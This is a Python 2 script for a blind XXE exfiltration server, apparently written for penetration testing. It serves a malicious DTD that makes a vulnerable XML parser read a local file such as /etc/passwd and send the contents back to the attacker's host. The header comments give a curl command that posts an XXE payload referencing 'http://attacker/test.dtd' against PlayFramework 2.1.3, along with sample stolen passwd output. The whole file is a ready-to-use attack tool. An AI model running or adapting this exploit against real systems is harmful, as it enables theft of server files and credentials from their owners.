#!/usr/bin/python

#
# Simple Blind XXE server intended to handle incoming requests for
# malicious DTD file, that will subsequently ask for locally stored file,
# like file:///etc/passwd.
#
# This program has been tested with PlayFramework 2.1.3 XXE vulnerability,
# to be run as follows:
#
# 0. Configure global variables: SERVER_SOCKET and RHOST
#
# 1. Run the below script, using:
#	$ python blindxxe.py <filepath>
#
#	where <filepath> can be for instance: "file:///etc/passwd"
#
# 2. Then, while server is running - invoke XXE by requesting e.g.
#	$ curl -X POST http://vulnerable/app --data-binary \
#		$'<?xml version="1.0"?><!DOCTYPE foo SYSTEM "http://attacker/test.dtd"><foo>&exfil;</foo>'
#
# The expected result will be like the following:
#
# $ python blindxxe.py 
# 	Exfiltrated file:///etc/passwd:
# 	------------------------------
# 	root:x:0:0:root:/root:/bin/sh
# 	nobody:x:65534:65534:nobody:/nonexistent:/bin/false
# 	user:x:1000:50:Linux User,,,:/home/user:/bin/sh
# 	play:x:100:65534:Linux User,,,:/var/www/play/:/bin/false
# 	mysql:x:101:65534:Linux User,,,:/home/mysql:/bin/false
#
#
# Mariusz B., 2016
#


from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import urllib
import re
import sys
import time
import threading
import socket

#
# CONFIGURE THE BELOW VARIABLES
#

SERVER_SOCKET 	= ('0.0.0.0', 8000)
EXFIL_FILE 		= 'file:///etc/passwd'

# The host on which you will run this server
RHOST 			= '192.168.56.1:' + str(SERVER_SOCKET[1])


EXFILTRATED_EVENT = threading.Event()

class BlindXXEServer(BaseHTTPRequestHandler):

	def response(self, **data):
		code = data.get('code', 200)
		content_type = data.get('content_type', 'text/plain')
		body = data.get('body', '')

		self.send_response(code)
		self.send_header('Content-Type', content_type)
		self.end_headers()
		self.wfile.write(body.encode('utf-8'))
		self.wfile.close()

	def do_GET(self):
		self.request_handler(self)

	def do_POST(self):
		self.request_handler(self)

	def log_message(self, format, *args):
		return

	def request_handler(self, request):
		global EXFILTRATED_EVENT

		path = urllib.unquote(request.path).decode('utf8')
		m = re.search('\/\?exfil=(.*)', path, re.MULTILINE)
		if m and request.command.lower() == 'get':
			data = path[len('/?exfil='):]
			print 'Exfiltrated %s:' % EXFIL_FILE
			print '-' * 30
			print urllib.unquote(data).decode('utf8')
			print '-' * 30 + '\n'
			self.response(body='true')

			EXFILTRATED_EVENT.set()

		elif request.path.endswith('.dtd'):
			#print '[DEBUG] Sending malicious DTD file.'
			dtd = '''<!ENTITY %% param_exfil SYSTEM "%(exfil_file)s">
<!ENTITY %% param_request "<!ENTITY exfil SYSTEM 'http://%(exfil_host)s/?exfil=%%param_exfil;'>">
%%param_request;''' % {'exfil_file' : EXFIL_FILE, 'exfil_host' : RHOST}

			self.response(content_type='text/xml', body=dtd)

		else:
			#print '[INFO] %s %s' % (request.command, request.path)
			self.response(body='false')

def main():
	server = HTTPServer(SERVER_SOCKET, BlindXXEServer)
	thread = threading.Thread(target=server.serve_forever)
	thread.daemon = True
	thread.start()

	while not EXFILTRATED_EVENT.is_set():
		pass

if __name__ == '__main__':
	if len(sys.argv) > 1:
		EXFIL_FILE = sys.argv[1]
	main()
